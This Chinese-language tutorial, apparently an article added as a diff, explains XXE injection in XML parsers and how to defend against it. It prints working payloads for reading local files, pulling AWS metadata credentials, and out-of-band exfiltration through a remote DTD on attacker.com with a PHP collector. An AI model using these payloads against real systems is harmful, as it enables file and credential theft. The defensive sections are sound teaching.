@@ -1,0 +1,194 @@
+引言
+
+XML（可扩展标记语言）作为互联网时代最早的结构化数据载体，至今仍广泛存在于SOAP API、文档格式（DOCX/SVG）、RSS订阅及老旧系统中。然而，当开发者开启XML解析器的“外部实体”功能而未加限制时，便引入了一个极为致命的漏洞——XXE（XML External Entity Injection）。本文将从XML基础理论出发，结合真实攻击场景，系统梳理XXE漏洞的成因、发现技巧、利用手法与防御方案，帮助读者构建从原理到实战的完整认知。
+
+---
+
+一、XML与HTML的本质分野
+
+在深入XXE之前，必须厘清XML与HTML的根本差异：
+
+· XML 被设计为传输和存储数据，其核心是数据的内容。它不关注显示效果，仅作为结构化文本，类似于JSON的角色。
+· HTML 被设计为显示数据，其核心是数据的外观呈现。
+
+正是这种“数据与显示分离”的定位，使得XML文档往往被后端解析器深度处理，而外部实体功能又赋予了XML从外部资源动态获取数据的能力——当这种能力被滥用时，便打开了内网探测、文件读取乃至远程代码执行的大门。
+
+---
+
+二、XXE漏洞原理：信任的代价
+
+XXE的全称是XML External Entity Injection，即XML外部实体注入。其核心成因可概括为：
+
+应用程序在解析用户可控的XML输入时，未禁用外部实体的加载，导致攻击者可以构造恶意DTD（文档类型定义），利用<!ENTITY>指令引用外部资源，进而实现非预期操作。
+
+一个典型的XML文档结构如下：
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [ 
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">   <!-- 外部实体定义 -->
+]>
+<stockCheck>
+  <productId>&xxe;</productId>               <!-- 实体引用 -->
+</stockCheck>
+```
+
+当解析器遇到&xxe;时，会将其替换为file:///etc/passwd的内容。若该文件可读且解析器返回实体替换后的结果，则敏感信息即被泄露。
+
+---
+
+三、XXE漏洞发现方法论
+
+1. 黑盒发现：多点测试
+
+· 数据类型试探：当抓包发现Content-Type: application/xml或text/xml时，直接提交XML payload。
+· 强制修改请求格式：即便原始请求为JSON或表单，尝试将Content-Type改为application/xml并附加XML Payload，部分服务端框架存在兼容解析。
+· 边缘功能触发：XXE不仅出现在API传输层，SVG图像上传、DOCX文档预览、Excel导入等依赖XML解析的功能点均可触发漏洞。
+
+2. 白盒审计：函数追踪
+
+在源码审计中，应重点关注以下函数：
+
+· PHP：simplexml_load_string()、DOMDocument::loadXML()
+· Java：DocumentBuilder.parse()、SAXBuilder.build()
+· Python：lxml.etree.parse()、xml.etree.ElementTree.fromstring()
+
+实战案例：某微信支付回调接口中，开发者编写notify_url函数调用了wechat_getxml，后者通过pe_getxml间接调用了simplexml_load_string，且未禁用外部实体，最终导致XXE。
+
+---
+
+四、XXE攻击实战图谱
+
+基础篇：文件读取与SSRF
+
+1. 读取任意文件
+适用系统必须支持file://协议，且无回显过滤：
+
+```xml
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root>&xxe;</root>
+```
+
+2. SSRF与云元数据窃取
+利用http://协议访问内部资源，经典场景为AWS元数据：
+
+```xml
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
+<stockCheck><productId>&xxe;</productId></stockCheck>
+```
+
+进阶篇：无回显利用与带外数据传递
+
+当服务端不回显实体解析结果时，需借助OOB（Out-of-Band）通道。
+
+Step 1：带外连通性测试
+使用DNSLog检测服务器是否发起了HTTP请求：
+
+```xml
+<!DOCTYPE test [ <!ENTITY % file SYSTEM "http://attacker.dnslog.cn"> %file; ]>
+<root>&send;</root>
+```
+
+Step 2：参数实体+远程DTD窃取数据
+将读取的文件内容通过HTTP GET发送至攻击服务器：
+
+恶意DTD（test.dtd）：
+
+```dtd
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/get.php?file=%file;'>">
+```
+
+Payload：
+
+```xml
+<!DOCTYPE ANY[
+  <!ENTITY % file SYSTEM "file:///c:/secret.txt">
+  <!ENTITY % remote SYSTEM "http://attacker.com/test.dtd">
+  %remote;
+  %all;
+]>
+<root>&send;</root>
+```
+
+攻击服务器get.php：
+
+```php
+<?php file_put_contents("file.txt", $_GET['file']); ?>
+```
+
+创新篇：新场景下的XXE利用
+
+1. XInclude绕过实体限制
+某些应用在接收用户输入后，将其动态嵌入到服务器端预定义的XML骨架中。攻击者无法控制整个DTD，但可利用XInclude指令：
+
+```xml
+<foo xmlns:xi="http://www.w3.org/2001/XInclude">
+  <xi:include parse="text" href="file:///etc/passwd"/>
+</foo>
+```
+
+2. SVG图像上传
+SVG本质是XML，当应用渲染用户上传的SVG图片时，可触发XXE：
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
+<svg>&xxe;</svg>
+```
+
+3. DOCX文档注入
+DOCX（Office Open XML）实为ZIP压缩的XML集合。修改[Content_Types].xml或word/document.xml，加入恶意实体，可在文档预览时泄露数据。
+
+4. SOAP API攻击
+SOAP消息基于XML，若其WSDL接口未禁用外部实体，可构造SOAP请求读取服务器文件。
+
+---
+
+五、防御方案：从根源切断攻击
+
+1. 完全禁用外部实体（推荐）
+
+不同语言的标准库均提供禁用外部实体的API：
+
+· PHP
+  ```php
+  libxml_disable_entity_loader(true);
+  ```
+· Java
+  ```java
+  DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
+  dbf.setExpandEntityReferences(false);
+  dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+  ```
+· Python (lxml)
+  ```python
+  from lxml import etree
+  parser = etree.XMLParser(resolve_entities=False)
+  tree = etree.parse(xml_source, parser)
+  ```
+
+2. 输入过滤与白名单
+
+过滤<!DOCTYPE、<!ENTITY、SYSTEM、PUBLIC等关键词。此方法易被变形绕过，仅作为辅助。
+
+3. 使用JSON替代XML
+
+尽可能迁移至JSON格式传输数据，可彻底规避XML解析类漏洞。
+
+---
+
+六、真实案例复盘
+
+· 某SRC报告：在http://web.jarvisoj.com:9882/中，通过SOAP服务XXE读取了/etc/passwd。
+· 某微信支付漏洞：开发者使用simplexml_load_string处理回调，未禁用实体，最终攻击者利用带外DTD读取了服务器d:/1.txt。
+· 阿里云先知社区案例：某OA系统的DOCX文档预览功能存在XXE，攻击者通过构造恶意Word文档，获取了域控敏感信息。
+
+详细复盘链接可参考：
+https://xz.aliyun.com/news/16463
+https://mp.weixin.qq.com/s/biQgwMU2v1I92CsDOFRB7g
+
+---
+
+结语
+
+XXE漏洞的生命周期与XML解析器的“默认不安全”配置紧密相关。许多开发者误以为XML已过时，而忽视了遗留系统及新兴文档格式中的风险。本文通过理论拆解与实战演练，揭示了XXE从简单文件读取到复杂带外信道的演进脉络。对于防御者，禁用外部实体是最直接有效的防线；对于攻击者，需不断探索SVG、DOCX、XInclude等新战场。唯有深刻理解数据交换的底层机制，才能在攻防对抗中立于不败之地。
